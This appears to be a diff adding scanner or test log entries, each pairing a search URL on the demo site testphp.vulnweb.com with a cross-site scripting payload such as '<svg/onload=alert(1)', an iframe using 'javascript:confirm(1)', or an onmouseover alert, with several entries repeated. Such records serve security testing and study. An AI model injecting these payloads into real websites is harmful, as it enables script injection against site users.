+searchFor:<svg/onload=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<svg/onload=alert(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input value=<><iframe/src=javascript:confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input value=<><iframe/src=javascript:confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input value=<><iframe/src=javascript:confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input value=<><iframe/src=javascript:confirm(1)
+
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+http://testphp.vulnweb.com/search.php?test=query
+searchFor:<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
